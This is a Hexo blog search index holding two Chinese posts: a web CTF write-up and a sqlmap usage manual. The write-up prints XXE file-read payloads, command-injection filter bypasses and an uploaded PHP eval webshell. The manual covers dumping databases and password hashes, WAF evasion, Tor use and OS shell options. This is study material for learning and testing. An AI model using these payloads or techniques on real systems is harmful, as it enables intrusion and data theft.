<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[广东强网杯--web篇]]></title>
    <url>%2F2019%2F10%2F12%2F%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF--web%E7%AF%87%2F</url>
    <content type="text"><![CDATA[0x00 前言好久没搭理博客，刚好今天闲着无聊就发现自己博客以及半年没跟更新了。惭愧惭愧。刚出整理出这几个月的总结发出来。以下是广东省第三届强网杯web初赛的writeup 0x01 web0x01 签到题网站访问 提示403. 构造HTTP请求Header实现“伪造来源IP” Not admin 通过抓包分析数据看看。Admin=0,尝试admin=1，getflag 0x02 XXXXX？？？ 查看源码 无结果。联想到XXE漏洞。目录扫除查看到index.php~备份文件 查看源码。典型的xxe漏洞， 通过构造payload：12345678&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;xxe&lt;/pass&gt;&lt;/creds&gt; 尝试以半天读取flag.php，但是不知道文件具体目录在哪。Google一下读取相对路径来利用php://filter/read=convert.base64-encode/resource=l来读取文件123456789Payload&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;xxe&lt;/pass&gt;&lt;/creds&gt; Bash64 解密：Flag: flag{IUyasd8213123123890} 0x03 ping填写127.0.0.1 发现执行了系统命令。但显示的数据字符有限。 尝试payload:；ls来执行系统命令,并成功执行。发现当前目录存在index.php 通过fuzz测试 发现系统采用黑名单，空格、cat、flag、| 管道符均被过滤（之前显示..也被过滤过，后来写write up发现没有）之前直接采用黑名单绕过法：Payload:12;a=;c=fla;d=g;e=p;$a$b$IFS$c.$d$ea=..;b=/;ls$IFS$a$b 查看根目录下存在flag文件，开始以为是文件，访问过之后报错。发现是文件构造payload查看文件内容Payload:1a=c;b=at;c=fla;d=g;$a$b$IFS../../ 因为显示字符有限所以只能显示地点，有点搞。|管道符也是禁用了。google找了半天，终于在一个黑暗的角落看到awk命令。构造payload：;a=c;b=at;c=fla;d=g;awk$IFS/$c$d/$a$b$IFS../../../$c$d(第二张图是之前做题截得) flag{llllll_U_GeT_Th3_fl4g} 0x04 PHP是世界上最…..的语言123PHP是世界上最.....的语言http://119.61.19.212:8082/flag格式：flag&#123;xxx&#125; 通过目录扫描，发现index.php文件查看得到源码1234567891011121314151617181920&lt;?phperror_reporting(E_ALL^E_NOTICE^E_WARNING);function GetYourFlag()&#123; echo file_get_contents("./flag.php");&#125;if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;27)&#123; die("Too Long."); &#125; if(preg_match('/[a-zA-Z0-9_&amp;^&lt;&gt;"\']+/',$_GET['code'])) &#123; die("Not Allowed."); &#125; @eval($_GET['code']);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 阅读了下下发现对code字符搜索下关键字发现是无数字webshell，而且是去年的一个题的。不过做了做了更多的限制除了限制字母数字外 限制了_ &lt; &gt; ^]等字符，并且长度小于27.搜索下无数字webshell，有三种方法1.通过与或运算 2 通过取反运算 3.通过自增三种方式都可以构造无数字webshell由于^在黑名单，则考虑取反运算本地搭建环境Getyourfalg取反 从而构造payload ?code=$=~ %98%9A%8B%86%90%8A%8D%99%93%9E%98;$()发送，发现过滤了_字符。。网上搜了下可以根据php7的特性：php7允许使用($a)();执行函数构造payload：(~%98%9A%8B%86%90%8A%8D%99%93%9E%98)() 成功。查看源码.getflag 0x05 代码审计当时放弃了 0x06 apihttp://119.61.19.212:8086/ 查看源码无任何东西owasp zap目录扫描 发现存在upload 403http://119.61.19.212:8086/api/ 200 OK访问该目录构造POST 文件 但是无法知道数组字段 尝试json数据{“filename”：”1”}一直不行.不断尝试字段发现filename=1 提示sorry cant read file 构造payload：filename={“name”:”flag”}payload：filename={“data”:”flag”}payload：filename={“filename”:”flag”} 均无果，后来对有说试一试file 结果显示空白，说明猜中了字段6666666666查实读取文件，直接../../../../../../../../../../etc/passwd 成功读取，说明存在文件包含漏洞后来发现可以直接读index.php文件读取/api/index.php文件 POST data= filename={“file”:”./index.php”}，右键查看源码得到数据 无可利用信息，尝试data= filename={“file”:”../index.php”}，读取根目录文件夹文件，发现是php反序列化的题 继续读取，hack.php Hack.php中过滤了”//””/””..”防止读取其他目录其他文件，并给出提示在fffffaa_not.php文件在反序列化中，preg_match(‘/[oc]:\d+:/i’,$data,$matches);筛掉了[oc]:数字: 如果payload：O:4:”hack”:1:{s:4:”file”;s:15:” fffffaa_not.php”;}中前面的O:4:符合正则的条件，因此将其绕过即可。利用符号+就不会正则匹配到数字正确payload：O:4:”hack”:1:{s:4:”file”;s:15:” fffffaa_not.php”;}但是提示无任何反应，尝试下url编码，成功。。（还剩半小时就结束了，慌的一批，还是不知道后面还有多少坑。。） 查看源码 上传文件，那就可以上传webshell。 对上传的数据黑名单匹配，之前遇到过，通过数组可以绕过。is_numeric()函数没遇到过，google一下就给绕过方法，通过在末尾加空格和任意字符绕过。Payload为：http://119.61.19.212:8086/fffffaa_not.php?jhh08881111jn[]=&lt;?php eval($_POST[“CMD”]);?&gt;&amp;&amp;file_na=2连接蚁剑连接。发现这么多php文件，难道大家都做出来了？？？找了半天没发现flag文。 还是一份钟了，当时慌的一批。手残点了一个php文件？？？？？然后getflag ，，这也太搞了吧。。最后一分钟getflag。。。。。。。。。。 0x03 总结本地比赛发现自己在代码审计能力方面还是有很多不足，还需要努力学习]]></content>
      <categories>
        <category>0x02 应用实践</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap使用手册]]></title>
    <url>%2F2019%2F04%2F06%2Fsql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[0x01 前言很多人会思考个概念使用工具去入侵机器？脚本小子？不，使用工具是对技术和开发者项工具的人的尊重，而脚本小子是并不知道什么原理就去拿工具去扫描。sqlmap——-&gt;官方网站是由python编写的开源自动化sql检测和利用工具。本文章是sqlmap使用总结和知识回顾 工作模式sql执行操作后： 1、判断可注入的参数2、判断可以用那种SQL注入技术来注入3、识别出哪种数据库4、根据用户选择，做相应的操作 特点 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB 等数据库均支持 支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4、联合查询注入，可以使用union的情况下的注入。5、堆查询注入，可以同时执行多条语句的执行时的注入 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列 支持脱库操作（用户可自行选择） 支持上传下载文件和命令执行（mysql，postgresql，sql server） sqlmap使用sql执行包括 Target（目标） Request（请求） Optimization（优化） Injection（注入） Detection（检测） Techniques（技巧） Fingerprint（指纹） Enumeration（枚举） Brute force（暴力破解） User-defined function injection（用户自定义函数注入） File system access（访问文件系统） Operating system access（操作系统访问） Windows注册表访问 General（一般）和杂项： Target（目标）参数： –url -u格式：http(s)://targeturl[:port]/[…]例如：python sqlmap.py -u”http://www.baidu.com/?id=1&quot; 参数： -m -l-m获取多个扫描目标，sqlmap会一个个检测。文件格式如： www.baidu.com?id=1www.sougou.com?id=2www.xx.com?id=3、 -l从Burp或WebScarab代理的日志中解析目标（包括post，cookie） 参数：-d直接连接数据库使用参数“-d”直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式： (1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为： DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为： DBMS://DATABASE_FILEPATH 我用如下命令连接装在本机上的Mysql： python sqlmap.py -d “mysql://root:root@127.0.0.1:3306/DISSchool” 却出现了错误，错误为： [CRITICAL] sqlmap requires ‘python-pymysql’ third-party library in order to directly connect to the DBMS ‘MySQL’. You can download it from ‘https://github.com/petehunt/PyMySQL/&#39;. Alternative is to use a package ‘python-sqlalchemy’ with support for dialect ‘mysql’ installed 意思是我没有安装Python连接Mysql用的第三方库python-pymysql。虽然我安装了python-mysqldb可以使Python连接Mysql，但显然Sqlmap使用的是python-pymysql而不是python-mysqldb。使用如下命令安装python-pymysql： git clone https://github.com/petehunt/PyMySQL/ cd PyMySQL/ sudo python setup.py install 安装好python-pymysql后再执行命令： python sqlmap.py -d “mysql://root:root@127.0.0.1:3306/DISSchool” 这次没有报错，成功的连接到了数据库。只是除了检测数据库确实是Mysql版本号大于等于5.0.0之外便什么都没有做。让Sqlmap做点什么需要用其他参数指定，这些参数我们稍晚些再学习。 参数： -rsqlmap可以从文本获取http请求头。有的请求需要加载cookie，post数据，有些waf，阿里云会根据sql请求头（User-agent: sqlmap/1.3#stable (http://sqlmap.org)）而封ip，这样加载可以通过一些检测和跳过设置cookie如： POST /vuln.php HTTP/1.1Host: www.baidu.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Cookie:BAIDUID=2FF9C5F75287AE0C94B0E3E9C8FEid=1 参数：-g-g 处理Google的结果作为目标URL python sqlmap.py -g “inurl:\”.php?id=1\”” 参数：-cCONFIGFILE 从配置文件中加载选项,需指定文件如sqlmap.conf，sqlmap会自动解析该配置文件，按照配置文件配置执行动作，除了指定攻击目标还支持，指定对应目标的各种参数(格式如安装目录中有一个名为 sqlmap.conf 的文件) Request（请求）在http请求阶段，往往在不同网站不同位置要求携带不同参数（refer，user-agent，cookie，post），只有携带要求的参数才能发起合法的请求。所以我们要根据目标网站需要而设定请求细节。 参数：–data,–param-del此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。 python sqlmap.py -u “http://www.baidu.com/1.php&quot; –data=”id=1” –param-del当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。 python sqlmap.py -u “http://www.baidu.com/1.php&quot; –data=”query=x;id=1” –param-del=”;” 参数：–cookie,–load-cookies,–drop-set-cookie –cookie-del有两种情况需要cookie： 注入的界面需要登录才能获取 cookie是否存在注入 可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。load-cookie从文件读取cookie如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数post参数默认分隔符；，指定分隔符–cookie-del python sqlmap.py -u “http://www.baidu.com/user.php&quot; --cookie “JSESSIONID=E5D6C8C81;NAME=werner;” 参数：–user-agent,–random-agent默认sqlmap请求头为如下，这种可能会被waf检测直接封ip User-agent: sqlmap/1.3#stable –user-agent用户指定请求头–random-agnet参数来随机的从./txt/user-agents.txt中获取当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。 参数：–referersqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入 参数：–headers可以通过–headers参数来增加额外的http头 参数：–delay过于频繁地发送请求可能会被网站察觉或其他后果,严重者可能服务器崩溃。使用参数“–delay”来指定 HTTP 请求之间的延迟，单位为秒，类型是浮点数，如“–delay 1.5”表示延迟 1.5 秒。默认是没有延迟的 参数：–timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒 参数：–retries当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次 参数：–randomize可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样 参数：–safe-url,–safe-post –safe-freq –safe-feq有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行 1、–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。2、–safe-post: 访问安全 URL 时携带的 POST 数据3、–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。4、–safe-req: 从文件中载入安全 HTTP 请求 参数：–skip-urlencode根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用–skip-urlencode参数 参数：–csrf-token 和–csrf-url现在有很多网站通过在表单中添加值为随机生成的 token 的隐藏字段来防止 CSRF 攻击，Sqlmap 会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。 –csrf-token 用于指定包含 token 的隐藏字段名，若这个字段名不是常见的防止 CSRF 攻击的字段名 Sqlmap 可能不能自动识别出，需要手动指定。如 Django 中该字段名为“csrfmiddlewaretoken”，明显与 CSRF 攻击有关。 –csrf-url 用于从任意的 URL 中回收 token 值。若最初有漏洞的目标 URL 中没有包含 token 值而又要求在其他地址提取 token 值时该参数就很有用 参数：–eval有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求 python sqlmap.py -u”http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()” 请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值 参数：–auth-type,–auth-cred这些参数可以用来登陆HTTP的认证保护支持三种方式：1、Basic2、Digest3、NTLM–auth-cred用于给出身份认证的凭证，格式是“username:password”。 python sqlmap.py -u “http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; –auth-type Basic –auth-cred “testuser:testpass” 参数：–proxy,–proxy-cred和–ignore-proxy使用–proxy代理是格式为：http://url:port。当HTTP(S)代理需要认证是可以使用–proxy-cred参数：username:password。–ignore-proxy拒绝使用本地局域网的HTTP(S)代理 参数：–auth-certWeb服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件 参数：–ignore-401使用该参数忽略 401 错误（未认证 参数：–tor、–tor-type、–tor-port 和–check-tor安装类似 Privoxy 这样的软件按照Tor 的安装指导配置一个 Tor 客户端。设置好后使用参数“–tor”让 Sqlmap 自动设置使用 Tor 代理如果想要手动指定 Tor 的类型和端口可以使用参数“–tor-type”和“–tor-port”如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后 Sqlmap 会确保所有流量都走 Tor 代理，若 Tor 代理失效，Sqlmap 会发出警告并退出。检测方法是访问Are you using Tor? 参数：–force-ssl强制使用 SSL Optimization（优化)可用于优化SqlMap的性能 参数：-o开启所有优化开关,添加此参数相当于同时添加下列三个优化参数：–keep-alive–null-connection–threads=3 参数：–keep-alive该参数让 Sqlmap 使用 HTTP 长连接。该参数与“–proxy”矛盾 参数：–null-connection有一种特殊的 HTTP 请求类型可以直接获得 HTTP 响应的大小而不用获得 HTTP 响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与“–text-only”矛盾。 参数：–threads使用该参数指定 Sqlmap 可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过 10(默认1) Injection（注入）参数：-p 和–skip默认情况下 Sqlmap 会测试所有 GET 参数和 POST 参数，当 level 大于等于 2 时会测试 cookie 参数，当 level 大于等于 3 时会测试 User-Agent 和 Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受 level 限制。这就是“-p”的作用。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数例如：–skip=”user-angent.referer”有时会遇到伪静态网页。像动态网页会明目张胆地列出参数，如： /user.php?id=1 显然参数是 id，值为 1。但若是伪静态网页则可能这样写： /user/1/ 将参数隐藏在 URL 中。通常情况下 Sqlmap 不会对这样的伪静态网页的参数做测试，因为 Sqlmap 无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上“*”，告诉 Sqlmap 哪个是伪静态参数就行，剩下事的和 GET 参数没有什么区别。如：1python sqlmap.py -u "http(s)://target.cc/user/1*/" 参数：–dbms默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有 MySQL、 Oracle PostgreSQL Microsoft SQL Server Microsoft Access SQLite Firebird Sybase SAP MaxDB DB2 对于 Mysql 和 Microsoft SQL Server 和要这样指定： –dbms MySQL –dbms Microsoft SQL Server 对于 MySQL 来说，是类似这样的：5.0。对于 Microsoft SQL Server 来说，是类似这样的：2005。如果在添加“–dbms”参数的同时还添加了“–fingerprint”，Sqlmap 只会在指定的数据库管理系统内进行指纹识别。只有在很确定时使用“–dbms”，否则还是让 Sqlmap 自动检测更好些 参数：–os默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有： Linux Windows 参数：–invalid-bignum当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错 参数：–invalid-logical原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19 参数：–prefix,–suffix需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行代码中是这样调用数据库的:1$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 这时你就需要–prefix和–suffix参数了1python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc" 这样执行的SQL语句变成：1$query = "SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1"; 参数：–tampersqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。若该 tamper 脚本位于 sqlmap 的安装目录的 tamper/目录中，就可以省略路径和后缀名，只写文件名。多个 tamper 脚本之间用空格隔开在 tamper/目录中有许多可用的 tamper 脚本。tamper 脚本的作用是对 payload 进行混淆。我们还可以自己写 tamper 脚本，这属于 Sqlmap 的高级用法，一个有效的 tamper 脚本如下所示：12345678910# 必须要导入的库from lib.core.enums import PRIORITY# 定义该 tamper 脚本的优先级__priority__ = PRIORITY.NORMALdef tamper(payload): '''此处是 tamper 的说明''' retVal = payload # 此处是用于修改 payload 的代码 # 返回修改后的 payload return retVal 参数：–no-escape有时 Sqlmap 会使用用单引号括起来的字符串值作为 payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)) 这样做既可以混淆视听让人一时难以洞察 payload 的内容又可以在后台服务器使用类似 magic_quote 或 mysql_real_escape_string 这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减 payload 长度，用户可以使用“–no-escape”来关闭字符串编码。 Detection（检测）可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容参数：–level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试 参数：–risk此参数用于指定风险等级，有 1~4 共 4 级。 1会测试大部分的测试语句(默认) 2会增加基于事件的测试语句 3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险 参数：–string,–not-string,–regexp,–code页面比较：默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200 参数：–text-only,–titles若是用户知道代表 True 的页面 title 和代表 False 的页面 title 不同，如代表 True 的页面 title 为“Welcome”，代表 False 的页面 title 为“Forbidden”，–titles”让 Sqlmap 依据 title 来判断 True 或 False若是 HTTP 响应体中有许多诸如 JavaScript 之类的活动内容，可以使用–text-only让 Sqlmap 只专注于纯文本内容 Techniques（技巧）这些选项可用于调整具体的SQL注入测试。B：Boolean-based blind（布尔型注入）E：Error-based（报错型注入）U：Union query-based（可联合查询注入）S：Stacked queries（可多语句查询注入）T：Time-based blind（基于时间延迟注入）Q：Inline queries（嵌套查询注入）可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效 Fingerprint（指纹）：参数 -f–fingerprint 执行检查广泛的DBMS版本指纹 Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句 参数：-b–banner 检索数据库管理系统的标识大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。通常这个函数是 version()、环境变量是@@version，当然要看目标数据库管理系统了。使用参数“-b”或“–banner”来列举数据库管理系统的这一信息 –current-user检索数据库管理系统当前用户 –current-db检索数据库管理系统当前数据库 –is-dba检测DBMS当前用户是否DBA –users枚举数据库管理系统用户 –passwords枚举数据库管理系统用户密码哈希 –privileges枚举数据库管理系统用户的权限当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的权限。通过用户权限可以判断哪些用户是管理员。若想只枚举特定用户的权限使用参数“-U”指定用户，可用“CU”来代表当前用户。若目标是微软的 SQL Server，这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限。 –roles枚举数据库管理系统用户的角色当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中用户的角色。若想只枚举特定用户的角色使用参数“-U”指定用户，可用“CU”来代表当前用户。官方手册上说只有目标数据库管理系统是 Oracle 时这一功能才可用，但我在 Mysql 中测试也是可用的 –dbs枚举数据库管理系统数据库当前用户有读取包含了数据库管理系统中可用数据库信息的系统表的权限时使用这一参数可以列举数据库管理系统中所有数据库 –tables枚举的DBMS数据库中的表没有用参数“-D”指定数据库，只使用参数“–tables”会列举所有数据库中所有表使用参数“–exclude-sysdbs”可排除系统数据库。在 Oracle 中要指定 TABLESPACE_NAME 而不是数据库名 –columns枚举DBMS数据库表列 –dump-C、-T、-D、–start、–stop 和–where权限允许时可以列举表中数据。用参数“-D”指定数据库，用参数“-T”指定数据表，用参数“-C”指定目标列。若只指定了数据表而没有指定数据库则默认使用当前数据库，若没有指定列则列举表中全部列。数据保存到 CSV 格式文件中，文件具体路径会在 Sqlmap 的输出中给出 –dump-all使用参数“–dump-all”可列举所有数据库所有表中所有数据。同样地，可使用参数“–exclude-sysdbs”排除系统数据库。 注意微软 SQL Server 的 master 数据库不属于系统数据库，因为有些管理员会在这个数据库中存储用户数据–search搜索列（S），表（S）和/或数据库名称（S）-D DB要进行枚举的数据库名-T TBL要进行枚举的数据库表-C COL要进行枚举的数据库列-U USER用来进行枚举的数据库用户–exclude-sysdbs枚举表时排除系统数据库–start=LIMITSTART第一个查询输出进入检索–stop=LIMITSTOP最后查询的输出进入检索–first=FIRSTCHAR第一个查询输出字的字符检索–last=LASTCHAR最后查询的输出字字符检索–sql-query=QUERY要执行的SQL语句–sql-shell提示交互式SQL的shell ##Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表–common-columns 检查存在共同列User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数–shared-lib=SHLIB 共享库的本地路径File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE从后端的数据库管理系统文件系统读取文件当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有读取文件相关权限时读取文件是可行的 –file-write=WFILE –file-dest=DFILEfile-write编辑后端的数据库管理系统文件系统上的本地文件file-dest后端的数据库管理系统写入文件的绝对路径当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有写文件相关权限时上传文件是可行的。上传的文件既可以是文件文件也可以是二进制文件. ### Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD –os-shell执行操作系统命令(若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就能利用 SQL 注入执行任意的操作系统命令)当数据库管理系统是 MySQL 或 PostgreSQL 时，Sqlmap 会通过前面介绍过的文件上传功能上传一个包含用户自定义函数 sys_exec()和 sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出当数据库管理系统是微软的 SQL Server 时，Sqlmap 通过存储过程 xp_cmdshell 来执行任意命令。若 xp_cmdshell 被禁用（SQL Server &gt;= 2005 时默认禁用）Sqlmap 会启用它；若 xp_cmdshell 不存在，Sqlmap 会创建它。 当用户想要看到命令执行的标准输出时，Sqlmap 使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令 –os-pwn –os-bof –os-smbrelayos-pwn获取一个OOB shell，meterpreter或VNCos-bof一键获取一个OOB shell，meterpreter或VNCos-smbrelay存储过程缓冲区溢出利用 –priv-esc数据库进程用户权限提升 –msf-path=MSFPATHMetasploit Framework本地的安装路径 –tmp-path=TMPPATH远程临时文件目录的绝对路径若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就有可能在攻击者的主机和数据库所在主机之间建立带外 TCP 连接。根据用户的选择，此连接可以是交互式命令 shell，Meterpreter 会话或图形用户界面（VNC）会话。 Sqlmap 要靠 Metasploit 生成 shellcode，在数据库所在主机执行 shellcode 有以下四种技术： 数据库通过 Sqlmap 创建的用户自定义函数 sys_bineval()在内存中执行 Metasploit 的 shellcode。支持 MySQL 和 PostgreSQL。参数“–os-pwn”。通过 Sqlmap 自己的用户自定义函数（MySQL 和 PostgreSQL 中的 sys_exec()，微软 SQL Server 中的 xp_cmdshell()）上传并执行 Metasploit 的“stand-alone payload stager”。参数：“–os-pwn”。利用远程代码执行漏洞MS08-068。攻击者的机器要用 Metasploit 的 smb_relay 监听来自目标机器的连接。要求在 Linux/Unix 上以 root 权限运行 Sqlmap 且目标 DBMS 在 Windows 上以管理员权限运行。参数：“–os-smbrelay”。在微软 SQL Server 2000 和 2005 中可通过存储过程 sp_replwritetovarbin 的堆缓冲区溢出漏洞（MS09-004）在内存中执行 Metasploit 的 shellcode。Sqlmap 有自己的数据执行保护绕过技术可以成功利用漏洞，但需要 Metasploit 生成 shellcode 以便在成功利用漏洞时执行 shellcode。参数：“–os-bof Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。 –reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型 General（一般）：这些选项可以用来设置一些一般的工作参数。sqlite会话文件保存位置 -s SESSIONFILE Load session from a stored (.sqlite) file 记录流量文件保存文件 -t TRAFFICFILE Log all HTTP traffic into a textual file 永远不要求用户输入，使用默认行为 –batch Never ask for user input, use the default behavior 具有二进制值的结果字段 –binary-fields=.. Result fields having binary values (e.g. “digest”) 在评估目标之前检查Internet连接 –check-internet Check Internet connection before assessing the target 从目标网址开始抓取网站 –crawl=CRAWLDEPTH Crawl the website starting from the target URL 正则表达式从抓取中排除页面（例如“logout”） –crawl-exclude=.. Regexp to exclude pages from crawling (e.g. “logout”) 分隔CSV输出中使用的字符（默认为“，”） –csv-del=CSVDEL Delimiting character used in CSV output (default “,”) 盲SQL注入字符集（例如“0123456789abcdef”） –charset=CHARSET Blind SQL injection charset (e.g. “0123456789abcdef”) 转储数据的格式（CSV（默认），HTML或SQLITE） –dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) 用于数据检索的字符编码（例如GBK） –encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) 显示每个输出的预计到达时间 –eta Display for each output the estimated time of arrival 刷新当前目标的会话文件 –flush-session Flush session files for current target 在目标URL上解析和测试表单 –forms Parse and test forms on target URL 忽略存储在会话文件中的查询结果,重新进行数据查询 –fresh-queries Ignore query results stored in session file 将所有HTTP流量记录到HAR文件中 –har=HARFILE Log all HTTP traffic into a HAR file 在数据检索期间使用十六进制转,检索结束后会转换回原来数据格式. –hex Use hex conversion during data retrieval 自定义输出目录路径 –output-dir=OUT.. Custom output directory path 分析和实现数据库内建报错信息 –parse-errors Parse and display DBMS error messages from responses 将命令保存成配置文件 –save=SAVECONFIG Save options to a configuration INI file 正则表达式从提供的代理日志中过滤目标 –scope=SCOPE Regexp to filter targets from provided proxy log 若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW” –test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) 